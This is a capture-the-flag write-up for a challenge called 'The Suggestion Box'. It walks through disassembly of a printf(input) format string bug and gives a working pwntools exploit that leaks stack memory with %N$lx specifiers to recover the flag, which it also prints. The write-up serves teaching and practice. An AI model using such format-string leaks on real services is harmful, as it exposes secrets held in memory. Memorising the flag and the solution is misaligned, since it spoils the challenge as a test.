---
title: "The Suggestion Box"
difficulty: Easy
description: "The company has set up an anonymous digital suggestion box for employees. Management is very proud of their new system -- they say it prints your feedback exactly as you wrote it. No filters, no censorship. Rumor has it there's something sensitive stored in the system's memory..."
flag: "CSC{f0rm4t_str1ng_vuln3r4b1l1ty_FTW}"
---

# Suggestion box

> *The company has set up an anonymous digital suggestion box for employees. Management is very proud of their new system -- they say it prints your feedback exactly as you wrote it. No filters, no censorship. Rumor has it there's something sensitive stored in the system's memory...*

```
$ strings suggestion_box 
[...]
flag.txt
       The Suggestion Box
  Your feedback matters to us!
Please enter your suggestion:
Thank you! Your suggestion has been noted:
suggestion_box.c
[...]
```

```
00000000004017fe <main>:
  ...
  401885:	lea    0x9677c(%rip),%rax     # "r"
  40188f:	lea    0x96774(%rip),%rax     # "flag.txt"
  401896:	mov    %rax,%rdi
  401899:	call   412680 <_IO_new_fopen> # fopen("flag.txt", "r")
  40189e:	mov    %rax,-0x298(%rbp)      # FILE *fp at rbp-0x298
  ...
  4018cf:	lea    -0x290(%rbp),%rax      # flag buffer at rbp-0x290
  4018d6:	mov    $0x80,%esi             # 128 bytes
  4018db:	mov    %rax,%rdi
  4018de:	call   4123d0 <_IO_fgets>     # fgets(flag_buf, 0x80, fp)
  ...
  401988:	lea    -0x210(%rbp),%rax      # input buffer at rbp-0x210
  40198f:	mov    $0x200,%esi            # 512 bytes
  401994:	mov    %rax,%rdi
  401997:	call   4123d0 <_IO_fgets>     # fgets(input, 0x200, stdin)
  ...
  4019c6:	lea    -0x210(%rbp),%rax      # input buffer
  4019cd:	mov    %rax,%rdi
  4019d0:	mov    $0x0,%eax
  4019d5:	call   40bb90 <_IO_printf>    # printf(input)  <-- format string vuln
```

So flag goes into `rbp-0x290`, user input goes into `rbp-0x210`, and then `printf(input)`. the flag is on the stack at a lower address than our input.

the distance between the two buffers is `0x290 - 0x210 = 0x80 = 128 bytes = 16 qwords`. on x86-64, the first 6 printf positional args come from registers (rdi, rsi, rdx, rcx, r8, r9), then stack starts at position 7. our input buffer itself is at some stack position, and the flag buffer is 0x80 bytes below it.

i tried `%8$s` first but that segfaults because position 8 contains the flag data itself (raw ASCII bytes), not a pointer to it. it tries to dereference "CSC{" as a memory address. nope. need to leak the raw hex values and convert them.

```python
from pwn import *

def solve(target):
    payload = b'.'.join(f'%{i}$lx'.encode() for i in range(8, 16))
    target.sendlineafter(b'> ', payload)
    target.recvuntil(b'---\n')
    line = target.recvline().strip().decode()

    flag_bytes = b''
    for hexval in line.split('.'):
        hexval = hexval.strip()
        if not hexval or hexval == '(nil)' or hexval == '0':
            flag_bytes += b'\x00' * 8
            continue
        val = int(hexval, 16)
        flag_bytes += val.to_bytes(8, 'little')

    flag = flag_bytes.split(b'\x00')[0].decode(errors='replace')
    return flag

r = remote(HOST, PORT)
flag = solve(r)
print(f'Flag: {flag}')
r.close()
```

the payload `%8$lx.%9$lx...%15$lx` dumps 8 qwords from the stack as hex, separated by dots. each qword gets converted from little-endian back to bytes and concatenated. the flag string is null-terminated so we split on `\x00`.

`CSC{f0rm4t_str1ng_vuln3r4b1l1ty_FTW}`
